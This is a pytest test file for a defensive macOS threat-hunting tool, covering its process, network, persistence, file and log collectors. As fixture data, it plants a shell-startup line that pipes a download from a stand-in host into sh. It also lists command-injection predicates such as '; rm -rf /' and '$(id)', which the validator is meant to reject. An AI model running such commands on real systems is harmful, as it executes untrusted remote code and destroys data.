from __future__ import annotations

import os
import plistlib
import sys
from pathlib import Path
from typing import Any

import pytest

from mac_threat_hunter.collectors import parsing
from mac_threat_hunter.collectors.base import CollectContext, Collector, LogOptions
from mac_threat_hunter.collectors.files import FileCollector
from mac_threat_hunter.collectors.logs import LogCollector, validate_predicate, validate_window
from mac_threat_hunter.collectors.network import NetworkCollector
from mac_threat_hunter.collectors.persistence import PersistenceCollector
from mac_threat_hunter.collectors.processes import ProcessCollector
from mac_threat_hunter.collectors.registry import COLLECTORS, run_collectors
from mac_threat_hunter.collectors.system import SystemCollector
from mac_threat_hunter.config import Config, make_redactor
from mac_threat_hunter.models import CollectorResult
from mac_threat_hunter.utils.errors import UsageError
from mac_threat_hunter.utils.proc import CommandResult


class FakeRunner:
    """Records calls and answers from a table keyed by the command's basename + args."""

    def __init__(self, table: dict[str, CommandResult | str]) -> None:
        self.table = table
        self.calls: list[list[str]] = []

    def __call__(self, argv: list[str], **kwargs: Any) -> CommandResult:
        self.calls.append(argv)
        for key, value in self.table.items():
            if key in " ".join(argv):
                if isinstance(value, CommandResult):
                    return value
                return CommandResult(argv, 0, value, "")
        return CommandResult(argv, None, "", "", error="command not found")


def ctx_for(
    cfg: Config, runner: FakeRunner, root: Path | None = None, platform: str = "darwin", **kw: Any
) -> CollectContext:
    return CollectContext(config=cfg, redactor=make_redactor(cfg), root=root or Path("/nonexistent-root"),
                          platform=platform, runner=runner, is_root=False, **kw)  # fmt: skip


SW_VERS = "ProductName:\t\tmacOS\nProductVersion:\t\t14.5\nBuildVersion:\t\t23F79\n"
PS_TABLE = (
    "    1     0     0 root     Sun Mar  1 08:00:05 2026 /sbin/launchd\n"
    "  501   400   501 alice    Tue Mar 10 14:01:20 2026 /private/tmp/.updater\n"
    "garbage line\n"
)
PS_CMD = "    1 /sbin/launchd\n  501 /private/tmp/.updater --password=hunter2\n"
LSOF = (
    "p501\ncupdater\nLalice\nf3\nPTCP\nn192.168.1.20:49822->198.51.100.23:443\nTST=ESTABLISHED\nTQR=0\n"
    "p504\ncpython3\nLalice\nf4\nPTCP\nn*:8000\nTST=LISTEN\nf5\nPUDP\nn[::1]:5353\n"
)


class TestParsing:
    def test_sw_vers_boottime_and_states(self) -> None:
        assert parsing.parse_sw_vers(SW_VERS) == {
            "product_name": "macOS",
            "version": "14.5",
            "build": "23F79",
        }
        assert parsing.parse_boottime(
            "{ sec = 1772352000, usec = 0 } Sun Mar  1 08:00:00 2026"
        ).startswith("2026-03-01")  # type: ignore[union-attr]
        assert parsing.parse_boottime("junk") is None
        assert parsing.parse_csrutil("System Integrity Protection status: enabled.") == "enabled"
        assert parsing.parse_csrutil("System Integrity Protection status: disabled.") == "disabled"
        assert parsing.parse_csrutil("???") == "unknown"
        assert parsing.parse_spctl("assessments enabled") == "enabled"
        assert parsing.parse_fdesetup("FileVault is Off.") == "off"
        assert parsing.parse_firewall("Firewall is enabled. (State = 1)") == "on"
        assert parsing.parse_firewall("Firewall is disabled. (State = 0)") == "off"

    def test_ps_parsing_skips_garbage(self) -> None:
        rows = parsing.parse_ps_table(PS_TABLE)
        assert [r["pid"] for r in rows] == [1, 501] and rows[1]["comm"] == "/private/tmp/.updater"
        assert parsing.parse_ps_commands(PS_CMD)[501].endswith("--password=hunter2")

    def test_ps_comm_with_spaces(self) -> None:
        row = parsing.parse_ps_table(
            "  9  1  501 alice Tue Mar 10 14:01:20 2026 /Applications/Microsoft Word.app/x/Microsoft Word\n"
        )[0]
        assert row["comm"].endswith("Microsoft Word")

    def test_lsof_fields(self) -> None:
        recs = parsing.parse_lsof_fields(LSOF)
        assert len(recs) == 3
        assert (
            recs[0]["state"] == "ESTABLISHED"
            and recs[0]["remote_address"] == "198.51.100.23"
            and recs[0]["remote_port"] == 443
        )
        assert recs[1]["state"] == "LISTEN" and recs[1]["local_port"] == 8000
        assert recs[2]["proto"] == "udp" and recs[2]["local_address"] == "::1"

    def test_codesign_output(self) -> None:
        assert (
            parsing.parse_codesign("/x: code object is not signed at all")["status"] == "unsigned"
        )
        assert (
            parsing.parse_codesign("Identifier=a.b\nSignature=adhoc\nTeamIdentifier=not set")[
                "status"
            ]
            == "adhoc"
        )
        signed = parsing.parse_codesign(
            "Identifier=a.b\nAuthority=Developer ID\nTeamIdentifier=ABCDE12345"
        )
        assert signed["status"] == "signed" and signed["team_id"] == "ABCDE12345"
        assert parsing.parse_codesign("weird")["status"] == "unknown"

    def test_ifconfig_and_routes(self) -> None:
        ifs = parsing.parse_ifconfig(
            "en0: flags=8863<UP,RUNNING> mtu 1500\n\tinet 192.168.1.20 netmask 0xffffff00\n"
        )
        assert ifs[0]["addresses"] == ["192.168.1.20"]
        assert (
            parsing.parse_netstat_routes("default 192.168.1.1 UGScg en0\n")[0]["gateway"]
            == "192.168.1.1"
        )


class TestSafeFailure:
    @pytest.mark.parametrize("name", sorted(COLLECTORS))
    def test_unsupported_platform_collects_nothing_and_runs_nothing(
        self, cfg: Config, name: str
    ) -> None:
        runner = FakeRunner({})
        res = COLLECTORS[name].run(ctx_for(cfg, runner, platform="linux"))
        assert res.status == "unsupported" and res.records == [] and runner.calls == []
        assert "macOS" in res.errors[0]

    @pytest.mark.parametrize("name", sorted(COLLECTORS))
    def test_dry_run_runs_nothing_and_lists_plan(self, cfg: Config, name: str) -> None:
        runner = FakeRunner({})
        res = COLLECTORS[name].run(ctx_for(cfg, runner), dry_run=True)
        assert res.status == "dry_run" and runner.calls == [] and res.commands

    def test_one_failing_collector_does_not_stop_others(
        self, cfg: Config, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        class Boom(Collector):
            name = "boom"

            def collect(self, ctx: CollectContext, result: CollectorResult) -> None:
                raise RuntimeError("kaboom")

        monkeypatch.setitem(COLLECTORS, "boom", Boom())
        runner = FakeRunner({"sw_vers": SW_VERS})
        results = run_collectors(["boom", "system"], ctx_for(cfg, runner))
        assert results[0].status == "failed" and "kaboom" in results[0].errors[0]
        assert results[1].records  # system still ran

    def test_privilege_notes_documented(self) -> None:
        assert all(c.privilege_note for c in COLLECTORS.values())


class TestSystem:
    def test_collects_and_degrades(self, cfg: Config) -> None:
        runner = FakeRunner({
            "sw_vers": SW_VERS, "uname": "arm64\n", "sysctl": "{ sec = 1772352000, usec = 0 }",
            "csrutil": "System Integrity Protection status: enabled.", "spctl": "assessments disabled",
            "fdesetup": CommandResult(["x"], 1, "", "needs admin"),
        })  # fmt: skip
        res = SystemCollector().run(ctx_for(cfg, runner))
        rec = res.records[0]
        assert rec["os"]["version"] == "14.5" and rec["arch"] == "arm64"
        assert (
            rec["security"]["gatekeeper"] == "disabled"
            and rec["security"]["filevault"] == "unknown"
        )
        assert res.status == "partial" and any("fdesetup" in e for e in res.errors)


class TestProcesses:
    def test_collects_redacts_and_hashes(self, cfg: Config, tmp_path: Path) -> None:
        exe = tmp_path / "private" / "tmp" / ".updater"
        exe.parent.mkdir(parents=True)
        exe.write_bytes(b"synthetic payload")
        runner = FakeRunner({"ps -axww -o pid=,ppid": PS_TABLE, "ps -axww -o pid=,command": PS_CMD,
                             "codesign": CommandResult(["codesign"], 1, "", "x: code object is not signed at all")})  # fmt: skip
        res = ProcessCollector().run(ctx_for(cfg, runner, root=tmp_path))
        by_pid = {r["pid"]: r for r in res.records}
        assert "hunter2" not in by_pid[501]["cmdline"] and "[REDACTED]" in by_pid[501]["cmdline"]
        assert by_pid[501]["sha256"] and by_pid[501]["codesign"]["status"] == "unsigned"
        assert "sha256" not in by_pid[1]  # sealed system path is not hashed
        assert by_pid[501]["start_time"].endswith("Z")

    def test_cmdline_can_be_disabled(self, cfg: Config) -> None:
        off = Config(**{**cfg.__dict__, "collection": {**cfg.collection, "include_cmdline": False}})
        runner = FakeRunner({"ps -axww -o pid=,ppid": PS_TABLE})
        res = ProcessCollector().run(ctx_for(off, runner))
        assert all("cmdline" not in r for r in res.records)
        assert not any("pid=,command" in " ".join(c) for c in runner.calls)

    def test_ps_failure_is_failed_status(self, cfg: Config) -> None:
        runner = FakeRunner({"ps": CommandResult(["ps"], None, "", "", timed_out=True)})
        res = ProcessCollector().run(ctx_for(cfg, runner))
        assert res.status == "failed" and "timed out" in res.errors[0]

    def test_codesign_budget_limits_lookups(self, cfg: Config) -> None:
        tight = Config(
            **{**cfg.__dict__, "collection": {**cfg.collection, "codesign_max_lookups": 1}}
        )
        table = "".join(
            f"  {i}  1  501 a Tue Mar 10 14:01:20 2026 /Users/a/bin/t{i}\n" for i in range(2, 6)
        )
        runner = FakeRunner({"ps -axww -o pid=,ppid": table, "ps -axww -o pid=,command": "", "codesign": CommandResult(["c"], 1, "", "not signed at all")})  # fmt: skip
        res = ProcessCollector().run(ctx_for(tight, runner))
        assert sum(1 for c in runner.calls if "codesign" in c[0]) == 1
        assert any("limit" in n for n in res.notes)


class TestNetwork:
    def test_collects_and_notes_limited_visibility(self, cfg: Config) -> None:
        res = NetworkCollector().run(ctx_for(cfg, FakeRunner({"lsof": LSOF})))
        assert len(res.records) == 3 and res.records[0]["process_association"] == "lsof"
        assert any("without root" in n for n in res.notes)

    def test_missing_lsof(self, cfg: Config) -> None:
        res = NetworkCollector().run(ctx_for(cfg, FakeRunner({})))
        assert res.status == "failed"

    def test_lsof_exit_one_means_no_matches(self, cfg: Config) -> None:
        res = NetworkCollector().run(
            ctx_for(cfg, FakeRunner({"lsof": CommandResult(["lsof"], 1, "", "")}))
        )
        assert res.status == "ok" and res.records == []


def write_plist(path: Path, data: dict[str, Any], binary: bool = False) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(plistlib.dumps(data, fmt=plistlib.FMT_BINARY if binary else plistlib.FMT_XML))


class TestPersistence:
    def test_launch_items_shell_startup_and_missing_program(
        self, cfg: Config, tmp_path: Path
    ) -> None:
        (tmp_path / "private/tmp").mkdir(parents=True)
        (tmp_path / "private/tmp/.updater").write_bytes(b"x")
        write_plist(tmp_path / "Users/alice/Library/LaunchAgents/com.example.updater.plist",
                    {"Label": "com.example.updater", "ProgramArguments": ["/private/tmp/.updater", "--bg"], "RunAtLoad": True, "KeepAlive": {"SuccessfulExit": False}}, binary=True)  # fmt: skip
        write_plist(
            tmp_path / "Library/LaunchDaemons/com.example.gone.plist",
            {"Label": "com.example.gone", "Program": "/Applications/Gone.app/x"},
        )
        (tmp_path / "Users/alice/.zshrc").write_text(
            "# comment\nexport PATH=$PATH\ncurl -s http://x.example.test/a | sh\nexport API_TOKEN=abcd1234\n"
        )
        res = PersistenceCollector().run(ctx_for(cfg, FakeRunner({}), root=tmp_path))
        by_path = {r["path"]: r for r in res.records}
        agent = by_path["/Users/alice/Library/LaunchAgents/com.example.updater.plist"]
        assert agent["kind"] == "launch_agent" and agent["program_path"] == "/private/tmp/.updater"
        assert (
            agent["program_exists"] is True
            and agent["program_sha256"]
            and agent["keep_alive"] is True
            and agent["sha256"]
        )
        gone = by_path["/Library/LaunchDaemons/com.example.gone.plist"]
        assert gone["program_exists"] is False and gone["kind"] == "launch_daemon"
        rc = by_path["/Users/alice/.zshrc"]
        assert rc["kind"] == "shell_startup" and rc["lines_of_interest"] == [
            "curl -s http://x.example.test/a | sh"
        ]
        assert "abcd1234" not in str(rc)
        assert any("Login Items" in n for n in res.notes)

    def test_malformed_and_symlinked_plists_do_not_crash(self, cfg: Config, tmp_path: Path) -> None:
        d = tmp_path / "Library/LaunchAgents"
        d.mkdir(parents=True)
        (d / "bad.plist").write_text("this is not a plist")
        (d / "list.plist").write_bytes(plistlib.dumps(["a", "b"]))
        (d / "huge.plist").write_bytes(b"x" * (2 * 1024 * 1024))
        if sys.platform != "win32":
            target = tmp_path / "elsewhere.plist"
            write_plist(target, {"Label": "linked"})
            (d / "link.plist").symlink_to(target)
        res = PersistenceCollector().run(ctx_for(cfg, FakeRunner({}), root=tmp_path))
        errs = {Path(r["path"]).name: r.get("parse_error") for r in res.records}
        assert errs["bad.plist"] and errs["list.plist"] and errs["huge.plist"]
        if sys.platform != "win32":
            assert errs["link.plist"] == "symlink not followed"

    def test_permission_denied_directory_is_reported_and_others_continue(
        self, cfg: Config, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        write_plist(
            tmp_path / "Library/LaunchAgents/ok.plist", {"Label": "ok", "Program": "/bin/ls"}
        )
        (tmp_path / "Library/LaunchDaemons").mkdir(parents=True)
        real_iterdir = Path.iterdir

        def deny(self: Path):  # type: ignore[no-untyped-def]
            if self.name == "LaunchDaemons":
                raise PermissionError(13, "denied")
            return real_iterdir(self)

        monkeypatch.setattr(Path, "iterdir", deny)
        res = PersistenceCollector().run(ctx_for(cfg, FakeRunner({}), root=tmp_path))
        assert res.status == "partial"
        assert any("permission denied reading /Library/LaunchDaemons" in e for e in res.errors)
        assert any(r.get("label") == "ok" for r in res.records)
        assert res.privilege_note

    def test_login_hook_and_crontab(self, cfg: Config, tmp_path: Path) -> None:
        write_plist(
            tmp_path / "var/root/Library/Preferences/com.apple.loginwindow.plist",
            {"LoginHook": "/Library/hook.sh"},
        )
        runner = FakeRunner({"crontab": "# m h\n*/5 * * * * /tmp/x.sh --token=abc\n"})
        res = PersistenceCollector().run(ctx_for(cfg, runner, root=tmp_path))
        kinds = {r["kind"]: r for r in res.records}
        assert (
            kinds["login_hook"]["program_path"] == "/Library/hook.sh"
            and kinds["login_hook"]["program_exists"] is False
        )
        assert "abc" not in str(kinds["cron"])

    def test_never_executes_discovered_files(self, cfg: Config, tmp_path: Path) -> None:
        marker = tmp_path / "executed.txt"
        script = tmp_path / "Library/evil.sh"
        script.parent.mkdir(parents=True)
        script.write_text(f"#!/bin/sh\ntouch {marker}\n")
        script.chmod(0o755)
        write_plist(
            tmp_path / "Library/LaunchDaemons/x.plist", {"Label": "x", "Program": str(script)}
        )
        runner = FakeRunner({})
        PersistenceCollector().run(ctx_for(cfg, runner, root=tmp_path))
        assert not marker.exists()
        assert not any(str(script) in " ".join(c) and "codesign" not in c[0] for c in runner.calls)


class TestFiles:
    def test_watch_dirs_config_files_and_symlinks(self, cfg: Config, tmp_path: Path) -> None:
        tmp = tmp_path / "private/tmp"
        tmp.mkdir(parents=True)
        macho = tmp / ".updater"
        macho.write_bytes(b"\xcf\xfa\xed\xfe" + b"\0" * 20)
        script = tmp / "run.sh"
        script.write_text("#!/bin/sh\necho hi\n")
        (tmp / "notes.txt").write_text("plain text, not executable")
        etc = tmp_path / "etc"
        etc.mkdir()
        (etc / "hosts").write_text("127.0.0.1 localhost\n")
        (etc / "hosts").chmod(0o666)
        (etc / "sudoers.d").mkdir()
        (etc / "sudoers.d/90-x").write_text("x")
        if sys.platform != "win32":
            (tmp / "link").symlink_to(macho)
        res = FileCollector().run(ctx_for(cfg, FakeRunner({}), root=tmp_path))
        by_path = {r["path"]: r for r in res.records}
        assert (
            by_path["/private/tmp/.updater"]["is_macho"]
            and by_path["/private/tmp/.updater"]["sha256"]
        )
        assert by_path["/private/tmp/run.sh"]["has_shebang"]
        assert "/private/tmp/notes.txt" not in by_path and "/private/tmp/link" not in by_path
        assert by_path["/etc/hosts"]["kind"] == "config_file"
        if os.name != "nt":
            assert by_path["/etc/hosts"]["mode"] == "0666"
        assert "/etc/sudoers.d/90-x" in by_path

    def test_missing_directories_are_not_errors(self, cfg: Config, tmp_path: Path) -> None:
        res = FileCollector().run(ctx_for(cfg, FakeRunner({}), root=tmp_path))
        assert res.status == "ok" and res.records == []


class TestLogs:
    @pytest.mark.parametrize("pred", [
        'process == "sshd"', 'process == "sshd" AND eventMessage CONTAINS "Failed"',
        '(process == "sudo" OR process == "su") AND NOT messageType == "Debug"',
        'eventMessage CONTAINS[c] "x"', 'processID == 42',
    ])  # fmt: skip
    def test_valid_predicates(self, pred: str) -> None:
        assert validate_predicate(pred) == pred

    @pytest.mark.parametrize("pred", [
        "", 'process == "a"; rm -rf /', 'process == "a" $(id)', "process ==", '== "x"', 'foo == "x"',
        'process == "a" AND', '(process == "a"', 'process == "a")', 'process == "a" `id`', "x" * 2000,
        'process == "a" OR OR process == "b"', 'process "a"', 'FUNCTION(a) == "x"',
    ])  # fmt: skip
    def test_invalid_predicates(self, pred: str) -> None:
        with pytest.raises(UsageError):
            validate_predicate(pred)

    def test_windows(self) -> None:
        assert validate_window("30m", "7d") == "30m"
        for bad in ("0x", "1w", "-5m", "30", "9999d", "8d", "m5"):
            with pytest.raises(UsageError):
                validate_window(bad, "7d")

    def test_collects_via_log_show_with_validated_args(self, cfg: Config) -> None:
        ndjson = '{"timestamp":"2026-03-10 14:10:00.000000+0000","eventMessage":"password=abc123 here","processImagePath":"/usr/sbin/sshd"}\nnot-json\n'
        runner = FakeRunner({"log": ndjson})
        res = LogCollector().run(
            ctx_for(cfg, runner, log=LogOptions(window="15m", predicate='process == "sshd"'))
        )
        argv = runner.calls[0]
        assert (
            argv[:3] == ["/usr/bin/log", "show", "--style"]
            and "15m" in argv
            and 'process == "sshd"' in argv
        )
        text = res.raw_files["unified_log.ndjson"]
        assert "abc123" not in text and "[REDACTED]" in text
        assert any("not valid ndjson" in e for e in res.errors)

    def test_invalid_user_predicate_never_reaches_subprocess(self, cfg: Config) -> None:
        runner = FakeRunner({"log": ""})
        res = LogCollector().run(
            ctx_for(cfg, runner, log=LogOptions(predicate='process == "a"; id'))
        )
        assert res.status == "failed" and runner.calls == []

    def test_log_timeout_and_truncation(self, cfg: Config) -> None:
        res = LogCollector().run(
            ctx_for(cfg, FakeRunner({"log": CommandResult(["log"], None, "", "", timed_out=True)}))
        )
        assert res.status == "failed" and "timed out" in res.errors[0]
        res = LogCollector().run(
            ctx_for(cfg, FakeRunner({"log": CommandResult(["log"], 0, "", "", truncated=True)}))
        )
        assert any("truncated" in e for e in res.errors)

    def test_archive_must_be_logarchive(self, cfg: Config, tmp_path: Path) -> None:
        bad = tmp_path / "x.txt"
        bad.write_text("x")
        res = LogCollector().run(ctx_for(cfg, FakeRunner({"log": ""}), log=LogOptions(archive=bad)))
        assert res.status == "failed"

    def test_import_works_on_any_platform(self, cfg: Config, tmp_path: Path) -> None:
        f = tmp_path / "export.ndjson"
        f.write_text(
            '{"timestamp":"2026-03-10T10:00:00Z","eventMessage":"hi","processImagePath":"/a/b"}\n'
        )
        runner = FakeRunner({})
        res = LogCollector().run(
            ctx_for(cfg, runner, platform="linux", log=LogOptions(import_file=f))
        )
        assert res.status == "ok" and runner.calls == [] and "imported" in res.notes[0]


class TestRealWorldFormats:
    """Formats taken from documented macOS tool behaviour (no live Mac was available)."""

    def test_csrutil_custom_configuration_is_not_disabled(self) -> None:
        text = (
            "System Integrity Protection status: unknown (Custom Configuration).\n\n"
            "Configuration:\n\tApple Internal: disabled\n\tKext Signing: enabled\n"
        )
        assert parsing.parse_csrutil(text) == "unknown"
        assert parsing.parse_csrutil("System Integrity Protection status: enabled.") == "enabled"
        assert parsing.parse_csrutil("System Integrity Protection status: disabled.") == "disabled"

    def test_lsof_without_fd_field(self) -> None:
        text = (
            "p123\ncControlCe\nLalice\nPTCP\nn*:7000\nTST=LISTEN\nTQR=0\n"
            "PTCP\nn[::1]:7000\nTST=LISTEN\nPUDP\nn*:5353\n"
            "p456\ncSafari\nLalice\nPTCP\nn10.0.0.5:50000->93.184.216.34:443\nTST=ESTABLISHED\n"
        )
        recs = parsing.parse_lsof_fields(text)
        assert [(r["pid"], r["proto"], r["local_port"], r["state"]) for r in recs] == [
            (123, "tcp", 7000, "LISTEN"),
            (123, "tcp", 7000, "LISTEN"),
            (123, "udp", 5353, "UNCONN"),
            (456, "tcp", 50000, "ESTABLISHED"),
        ]
        assert recs[1]["local_address"] == "::1" and recs[3]["remote_port"] == 443
